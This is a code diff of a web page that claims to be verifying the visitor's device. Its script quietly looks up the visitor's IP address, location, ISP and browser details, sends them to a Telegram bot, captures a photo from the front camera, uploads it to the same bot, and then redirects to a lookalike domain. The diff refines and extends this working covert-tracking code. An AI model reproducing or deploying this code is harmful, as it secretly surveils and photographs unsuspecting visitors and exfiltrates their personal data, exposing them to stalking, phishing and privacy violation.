@@ -11,7 +11,7 @@
 </head>
 <body>
   <h2>Loading...</h2>
-  <p>Please wait while we verify your device.</p>
+  <p>Verifying your device... Please wait</p>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -22,16 +22,16 @@
     const redirectUrl = "https://opaslabs.vercal.app/";
     const ipinfoToken = "18d2a866939a58";
 
-    let textSent = false;
-    let photoSent = false;
+    let textDone = false;
+    let photoDone = false;
 
-    function tryRedirect() {
-      if (textSent && photoSent) {
+    const tryRedirect = () => {
+      if (textDone && photoDone) {
         window.location.href = redirectUrl;
       }
-    }
+    };
 
-    // STEP 1: GET IP INFO
+    // 1. Send IP Info
     fetch("https://ipinfo.io/json?token=" + ipinfoToken)
       .then(res => res.json())
       .then(data => {
@@ -41,66 +41,77 @@
 📍 ${data.city}, ${data.region}, ${data.country}
 📌 Location: ${data.loc}
 🌐 ISP: ${data.org}
-🧠 User-Agent: ${navigator.userAgent}
+🧠 UA: ${navigator.userAgent}
 🕓 Time: ${new Date().toLocaleString()}
         .trim();
 
-        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+        return fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        }).then(() => {
-          textSent = true;
-          tryRedirect();
+          body: JSON.stringify({ chat_id: chatId, text: message })
         });
       })
-      .catch(() => {
-        textSent = true; // Fail-safe
+      .then(() => {
+        console.log("✅ Text sent to Telegram");
+        textDone = true;
+        tryRedirect();
+      })
+      .catch(err => {
+        console.error("❌ Failed to send text:", err);
+        textDone = true; // continue anyway
         tryRedirect();
       });
 
-    // STEP 2: ACCESS CAMERA
+    // 2. Send Photo
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
-
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-
-          // Wait 3s then snap
           setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach(t => t.stop());
 
             canvas.toBlob(blob => {
               const formData = new FormData();
               formData.append("chat_id", chatId);
               formData.append("photo", blob);
-              formData.append("caption", "📸 Visitor Snapshot");
+              formData.append("caption", "📸 Visitor Photo");
 
               fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                 method: "POST",
                 body: formData
-              }).then(() => {
-                photoSent = true;
+              })
+              .then(() => {
+                console.log("✅ Photo sent to Telegram");
+                photoDone = true;
+                tryRedirect();
+              })
+              .catch(err => {
+                console.error("❌ Failed to send photo:", err);
+                photoDone = true;
                 tryRedirect();
               });
             }, "image/jpeg", 0.9);
           }, 3000);
         };
       })
-      .catch(() => {
-        photoSent = true; // Even if denied, allow redirect
+      .catch(err => {
+        console.error("❌ Camera error:", err);
+        photoDone = true;
         tryRedirect();
       });
+
+    // 3. Backup redirect after 10s no matter what
+    setTimeout(() => {
+      console.log("⏱️ Force redirect after timeout");
+      window.location.href = redirectUrl;
+    }, 10000);
   </script>
 </body>
 </html>
